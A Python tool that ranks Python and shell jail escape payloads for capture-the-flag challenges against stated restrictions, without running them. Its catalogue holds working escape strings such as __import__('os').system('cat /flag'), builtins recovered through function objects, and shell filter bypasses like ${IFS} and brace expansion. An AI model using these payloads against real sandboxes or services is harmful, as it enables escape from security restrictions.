#!/usr/bin/env python3
"""Offline Python/shell-jail escape candidate ranker.

Input is a constraint description, never executable challenge data.  The engine compares a
curated payload catalogue with explicit banned characters, banned substrings and structural
restrictions, then returns ranked strings annotated with their assumptions and violations.
It does **not** evaluate, spawn, import through, or otherwise detonate any candidate.

The catalogue deliberately uses symbolic placeholders such as ``/flag`` and ``CMD``.  A human
must review a candidate against the assigned challenge before sending it through a scoped client.
"""
from __future__ import annotations

import argparse
import dataclasses
import json
import re
import shlex
import sys
from typing import Iterable

MAX_DESCRIPTION = 32_768
MAX_BANS = 256
MAX_TOKEN = 256


@dataclasses.dataclass(frozen=True)
class Constraints:
    mode: str = "python"
    banned_chars: frozenset[str] = frozenset()
    banned_substrings: tuple[str, ...] = ()
    no_builtins: bool = False
    no_parentheses: bool = False
    no_quotes: bool = False
    no_slash: bool = False
    expression_only: bool = False
    version: str | None = None
    ast_filter: bool = False
    audit_hook: bool = False

    def validate(self) -> None:
        if self.mode not in {"python", "shell"}:
            raise ValueError("mode must be python or shell")
        if len(self.banned_chars) > MAX_BANS or len(self.banned_substrings) > MAX_BANS:
            raise ValueError("too many banned constraints")
        if any(len(x) > MAX_TOKEN for x in self.banned_substrings):
            raise ValueError("a banned substring is too long")


@dataclasses.dataclass(frozen=True)
class Candidate:
    name: str
    mode: str
    payload: str
    technique: str
    assumptions: tuple[str, ...] = ()
    requires_builtins: bool = False
    uses_parentheses: bool = False
    uses_quotes: bool = False
    uses_slash: bool = False
    expression: bool = True
    audit_sensitive: bool = False
    base_rank: int = 50


CATALOGUE: tuple[Candidate, ...] = (
    Candidate("python-import", "python", "__import__('os').system('cat /flag')",
              "direct builtin import and command execution",
              ("__import__ is reachable", "os.system is not separately blocked"),
              True, True, True, True, audit_sensitive=True, base_rank=92),
    Candidate("python-breakpoint", "python", "breakpoint()",
              "enter the configured Python debugger",
              ("PYTHONBREAKPOINT/default pdb is enabled",), True, True, False, False,
              audit_sensitive=True, base_rank=82),
    Candidate("python-help-builtins", "python",
              "help.__call__.__builtins__['__import__']('os').system('cat /flag')",
              "recover builtins through a Python function object",
              ("help remains in globals", "function __builtins__ is a mapping"),
              False, True, True, True, audit_sensitive=True, base_rank=78),
    Candidate("python-subclasses", "python", "().__class__.__base__.__subclasses__()",
              "enumerate loaded classes as a capability-discovery primitive",
              ("dunder attributes are permitted", "a useful class is already loaded"),
              False, True, False, False, base_rank=70),
    Candidate("python-catch-warnings", "python",
              "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__",
              "recover a builtins mapping through the loaded warnings helper class",
              ("warnings.catch_warnings is already loaded", "dunder attributes and comprehensions are permitted"),
              False, True, True, False, base_rank=62),
    Candidate("python-fstring-attribute", "python", "f'{help.__call__.__builtins__}'",
              "force an allowed expression sink to traverse attributes",
              ("f-strings are accepted", "help remains available"),
              False, False, True, False, base_rank=56),
    Candidate("shell-ifs", "shell", "cat${IFS}/flag",
              "replace a literal space with the shell field separator",
              ("parameter expansion is enabled", "IFS has its conventional value"),
              False, False, False, True, expression=False, base_rank=92),
    Candidate("shell-brace", "shell", "{cat,/flag}",
              "use brace expansion to synthesize command and argument",
              ("brace expansion is enabled (bash/zsh)",),
              False, False, False, True, expression=False, base_rank=86),
    Candidate("shell-stdin", "shell", "cat</flag",
              "use input redirection without a separating space",
              ("redirections are allowed",), False, False, False, True,
              expression=False, base_rank=84),
    Candidate("shell-wildcards", "shell", "?at /fla?",
              "replace banned command/path characters with glob wildcards",
              ("the glob expands uniquely", "space and slash remain available"),
              False, False, False, True, expression=False, base_rank=70),
    Candidate("shell-slash-from-path", "shell", "cat ${PATH:0:1}flag",
              "derive slash from PATH substring expansion",
              ("bash substring expansion is enabled", "PATH begins with slash"),
              False, False, False, False, expression=False, base_rank=66),
    Candidate("shell-command-substitution", "shell", "$(printf cat)${IFS}/flag",
              "construct the command name through substitution",
              ("command substitution and printf are allowed",),
              False, True, False, True, expression=False, base_rank=58),
)


def _split_tokens(value: str) -> list[str]:
    if len(value) > MAX_DESCRIPTION:
        raise ValueError("constraint text is too large")
    try:
        parts = shlex.split(value)
    except ValueError:
        parts = re.split(r"[\s,]+", value)
    return [p for p in parts if p][:MAX_BANS]


def parse_constraints(description: str, *, mode: str | None = None) -> Constraints:
    """Conservatively extract common constraints from natural-language text.

    Explicit JSON/dict input should use :func:`constraints_from_mapping`; this parser only
    marks restrictions it can see directly and never invents an allowance.
    """
    if not isinstance(description, str) or len(description) > MAX_DESCRIPTION:
        raise ValueError("constraint description is too large")
    low = description.lower()
    inferred_mode = mode or ("shell" if re.search(r"\b(?:bash|shell|sh jail)\b", low) else "python")

    banned_chars: set[str] = set()
    banned_substrings: list[str] = []
    for match in re.finditer(
            r"(?:banned?|forbidden|disallow(?:ed)?|no)\s+(?:characters?|chars?)\s*[:=]?\s*"
            r"(.+?)(?=;\s*(?:audit|ast|no|without|banned|forbidden|disallow)|[.\n]|$)",
            description, re.I):
        raw = match.group(1).strip()
        quoted = re.findall(r"['\"](.{1,32}?)['\"]", raw)
        tokens = quoted or _split_tokens(raw)
        for token in tokens:
            # A 'characters' declaration is treated character-wise, including compact "()_.".
            banned_chars.update(token if len(token) > 1 else [token])
    for match in re.finditer(
            r"(?:banned?|forbidden|disallow(?:ed)?|no)\s+(?:words?|substrings?|names?)\s*[:=]?\s*"
            r"(.+?)(?=;\s*(?:audit|ast|no|without|banned|forbidden|disallow)|[.\n]|$)",
            description, re.I):
        raw = match.group(1).strip()
        banned_substrings.extend(re.findall(r"['\"](.{1,256}?)['\"]", raw) or _split_tokens(raw))

    version_m = re.search(r"python\s*(\d+(?:\.\d+){0,2})", low)
    out = Constraints(
        mode=inferred_mode,
        banned_chars=frozenset(list(banned_chars)[:MAX_BANS]),
        banned_substrings=tuple(dict.fromkeys(banned_substrings[:MAX_BANS])),
        no_builtins=bool(re.search(r"(?:no|without|removed?)\s+_?builtins_?", low)),
        no_parentheses=bool(re.search(r"(?:no|without|banned?)\s+(?:parentheses|parens|round brackets)", low)),
        no_quotes=bool(re.search(r"(?:no|without|banned?)\s+(?:quotes|strings?)", low)),
        no_slash=bool(re.search(r"(?:no|without|banned?)\s+(?:slash|/)", low)),
        expression_only=bool(re.search(r"(?:expression(?:s)? only|eval mode|single expression)", low)),
        version=version_m.group(1) if version_m else None,
        ast_filter="ast" in low and bool(re.search(r"filter|whitelist|allowlist|block", low)),
        audit_hook="audit" in low and bool(re.search(r"hook|filter|block", low)),
    )
    out.validate()
    return out


def constraints_from_mapping(obj: dict) -> Constraints:
    """Build validated constraints from a bounded JSON-compatible mapping."""
    if not isinstance(obj, dict) or len(obj) > 32:
        raise ValueError("constraints JSON must be a small object")

    def seq(name: str) -> list[str]:
        value = obj.get(name, [])
        if isinstance(value, str):
            value = list(value) if name == "banned_chars" else [value]
        if not isinstance(value, list) or len(value) > MAX_BANS:
            raise ValueError(f"{name} must be a bounded list")
        result = [str(v) for v in value]
        if any(len(v) > MAX_TOKEN for v in result):
            raise ValueError(f"{name} contains an overlong value")
        return result

    out = Constraints(
        mode=str(obj.get("mode", "python")).lower(),
        banned_chars=frozenset(seq("banned_chars")),
        banned_substrings=tuple(seq("banned_substrings")),
        no_builtins=bool(obj.get("no_builtins", False)),
        no_parentheses=bool(obj.get("no_parentheses", False)),
        no_quotes=bool(obj.get("no_quotes", False)),
        no_slash=bool(obj.get("no_slash", False)),
        expression_only=bool(obj.get("expression_only", False)),
        version=str(obj["version"]) if obj.get("version") is not None else None,
        ast_filter=bool(obj.get("ast_filter", False)),
        audit_hook=bool(obj.get("audit_hook", False)),
    )
    out.validate()
    return out


def assess(candidate: Candidate, constraints: Constraints) -> dict:
    """Return a serializable compatibility assessment without executing the payload."""
    violations: list[str] = []
    payload = candidate.payload
    present = sorted(ch for ch in constraints.banned_chars if ch and ch in payload)
    if present:
        violations.append("banned characters present: " + " ".join(repr(x) for x in present))
    present_words = [word for word in constraints.banned_substrings if word and word.lower() in payload.lower()]
    if present_words:
        violations.append("banned substrings present: " + ", ".join(repr(x) for x in present_words))
    if constraints.no_builtins and candidate.requires_builtins:
        violations.append("requires directly reachable builtins")
    if constraints.no_parentheses and candidate.uses_parentheses:
        violations.append("uses parentheses")
    if constraints.no_quotes and candidate.uses_quotes:
        violations.append("uses quotes")
    if constraints.no_slash and candidate.uses_slash:
        violations.append("uses a literal slash")
    if constraints.expression_only and not candidate.expression:
        violations.append("is not a single expression")
    if constraints.audit_hook and candidate.audit_sensitive:
        violations.append("likely intercepted by a Python audit hook")
    if constraints.ast_filter:
        # We cannot know an unspecified allowlist.  Keep it as a review warning, not a proven failure.
        ast_note = "unspecified AST filter requires manual node review"
    else:
        ast_note = None
    score = candidate.base_rank - 20 * len(violations) - (5 if ast_note else 0)
    return {
        "name": candidate.name,
        "mode": candidate.mode,
        "payload": payload,
        "technique": candidate.technique,
        "satisfies": not violations,
        "violations": violations,
        "warnings": [ast_note] if ast_note else [],
        "assumptions": list(candidate.assumptions),
        "score": max(0, score),
    }


def suggest(constraints: Constraints, *, include_blocked: bool = True,
            limit: int = 20) -> list[dict]:
    """Rank compatible catalogue entries; blocked entries optionally follow as diagnostics."""
    constraints.validate()
    if not 1 <= limit <= 100:
        raise ValueError("limit must be 1..100")
    rows = [assess(c, constraints) for c in CATALOGUE if c.mode == constraints.mode]
    if not include_blocked:
        rows = [row for row in rows if row["satisfies"]]
    rows.sort(key=lambda row: (not row["satisfies"], -row["score"], row["name"]))
    return rows[:limit]


def render(rows: Iterable[dict]) -> str:
    lines = ["Offline jail candidates (review only; nothing was executed):"]
    for index, row in enumerate(rows, 1):
        state = "fits stated constraints" if row["satisfies"] else "blocked"
        lines.append(f"[{index}] {row['name']} ({row['score']}, {state})")
        lines.append(f"    {row['payload']}")
        lines.append(f"    technique: {row['technique']}")
        if row["violations"]:
            lines.append("    violations: " + "; ".join(row["violations"]))
        if row["warnings"]:
            lines.append("    warnings: " + "; ".join(row["warnings"]))
        lines.append("    assumptions: " + "; ".join(row["assumptions"]))
    return "\n".join(lines) + "\n"


class _ArgumentParser(argparse.ArgumentParser):
    def error(self, message: str) -> None:
        raise ValueError(message)


def main(argv: list[str] | None = None) -> int:
    parser = _ArgumentParser(description="rank offline pyjail/shell-jail escape candidates")
    parser.add_argument("description", nargs="?", help="natural-language constraint description")
    parser.add_argument("--constraints-json", help="JSON object or @path with explicit constraints")
    parser.add_argument("--mode", choices=("python", "shell"))
    parser.add_argument("--only-compatible", action="store_true")
    parser.add_argument("--limit", type=int, default=20)
    parser.add_argument("--json", action="store_true")
    try:
        args = parser.parse_args(argv)
        if args.constraints_json:
            raw = args.constraints_json
            if raw.startswith("@"):
                path = raw[1:]
                with open(path, "r", encoding="utf-8") as handle:
                    raw = handle.read(MAX_DESCRIPTION + 1)
            if len(raw) > MAX_DESCRIPTION:
                raise ValueError("constraints JSON is too large")
            obj = json.loads(raw)
            if args.mode:
                obj["mode"] = args.mode
            constraints = constraints_from_mapping(obj)
        elif args.description is not None:
            constraints = parse_constraints(args.description, mode=args.mode)
        else:
            raise ValueError("give a description or --constraints-json")
        rows = suggest(constraints, include_blocked=not args.only_compatible, limit=args.limit)
        if args.json:
            print(json.dumps({"constraints": dataclasses.asdict(constraints), "candidates": rows},
                             indent=2, default=list))
        else:
            sys.stdout.write(render(rows))
        return 0
    except (ValueError, OSError, json.JSONDecodeError) as exc:
        print(f"jail_escape: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
